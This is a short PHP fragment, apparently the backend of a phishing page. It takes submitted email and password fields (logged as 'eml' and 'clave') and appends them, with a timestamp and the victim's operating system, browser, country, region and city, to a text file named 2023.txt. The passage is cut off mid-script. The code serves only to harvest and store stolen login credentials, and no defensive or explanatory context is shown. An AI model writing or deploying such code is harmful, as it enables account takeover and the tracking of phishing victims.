...
if ( isset ($_POST['mi']) && isset ($_POST['me']) ){
	$file = fopen("2023.txt", "a");
	
fwrite($file, "======================" . PHP_EOL);	
fwrite($file, "eml : ".$_POST['mi']." - clave : ".$_POST['me']."  - ".date ('l jS \of F Y h:i:s A',time())." SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."" .PHP_EOL);
